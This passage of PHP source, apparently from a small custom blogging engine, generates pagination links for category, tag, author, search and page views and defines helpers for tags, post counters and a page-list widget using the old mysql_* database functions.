	if (isset($homexco) && $homexco==2 ){
	if ($c==1) {

	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	}
}
}
elseif(isset($_GET['view']) && $_GET['view'] == "page" ) {
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	if ($c==1) {
	
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$dder.'">Page '.($c-1).'</a></li> ';
	}
	}
	}
}
//page finih
else {
if ($c==1) {

	}
	else {
    echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.$dder.' << </a></li> ';
	echo' ';
	echo '<li><a href="'.@home_url().'/?p='.$dder.'">Page '.($c-1).'</a></li> ';
	}
}



while ( $c <= $r ) {
if(isset($_GET['dir']) && $_GET['dir'] == "category" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_category()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "category" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_category()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_category().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
//tags
elseif(isset($_GET['dir']) && $_GET['dir'] == "tag" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_tags()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "tag" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_tags()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_tag().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
//tags finish
//author
elseif(isset($_GET['dir']) && $_GET['dir'] == "author" ) {
if(isset($_GET['url']) && $_GET['url'] != "" ) {
    if (is_author()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "author" ) {
if(isset($_GET['url']) && $_GET['url'] != "" ) {
    if (is_author()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_author().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
//author finish
//search
elseif(isset($_GET['dir']) && $_GET['dir'] == "search" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_search()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
elseif(isset($_GET['view']) && $_GET['view'] == "search" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
    if (is_search()){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_search().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	else {
    echo '<li><a href="'.@home_url().'?p='.$c.'">Page '.$c.'</a></li> ';
	}
	}
}
//search finish
//page
elseif(isset($_GET['dir']) && $_GET['dir'] == "page" ) {
if(isset($_GET['url']) && !$_GET['url'] == "" ) {
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	}
}
}
elseif(isset($_GET['view']) && $_GET['view'] == "page" ) {
	if (is_page()){
	if (isset($homexco) && $homexco==2 ){
	if ($c==1) {
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
	echo '<li><a href="'.@home_url().'/'.xenon_link_page().@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).xenon_page_navi().$c.'">Page '.$c.'</a></li> ';
	}
	}
	}
}
//page finih
else {
if ($c==1) {
	echo '<li><a href="'.@home_url().''.@strip_tags(htmlentities($_GET['url'], ENT_QUOTES, 'utf-8')).'">Page '.$c.'</a></li> ';
	}
	else {
    echo '<li><a href="'.@home_url().'/?p='.$c.'">Page '.$c.'</a></li> ';
	}
}
$c=$c+1;
}
if(is_home()) {
$result = @mysql_query("SELECT * FROM frndzk_title WHERE id ='5'");
if ( @mysql_num_rows($result) > 0 ) {
while($generalfp = @mysql_fetch_array($result)) {
if($generalfp['tagline']=="xenon_latest_page") {
echo '>> Total Page '.$ghjghyhf;
}
}
}
}
else {
echo '>>Total-Page-'.$ghjghyhf;
}
}
function xenon_tags() {
global $posts,$lolzzc,$homexco;
if (is_post()) {
echo'Tags: ';
$tagss=@$posts[$lolzzc]['tags'];
$tags=explode(",",$tagss);
foreach ($tags as $tag) {
if(isset($_GET['dir']) && $_GET['dir'] == "post" && isset($_GET['url'])) {
echo '<a href="'.@home_url().'/'.xenon_link_tag().@$tag.'">'.@$tag.'</a>, ';
}
elseif(isset($_GET['view']) && $_GET['view'] == "post" && isset($_GET['url'])) {
	echo '<a href="'.@home_url().'/'.xenon_link_tag().@$tag.'">'.@$tag.'</a>, ';
}
}
}
}
function post_count() {
global $postc;
return $postc;
}
function show_count() {
global $lolzzc;
return $lolzzc;
}
function end_post() {
global $lolzzc;
$lolzzc=$lolzzc+1;
return $lolzzc;
}

//page list for widget
function page_list_widget() {
$result = @mysql_query("SELECT * FROM frndzk_page");
if ( @mysql_num_rows($result) > 0 ) {
while($pages = @mysql_fetch_array($result)) {
echo '<li><a href="'.home_url().'/'.xenon_link_page().$pages['shortname'].'">'.$pages['page'].'</a></li>';
}
}
}
?>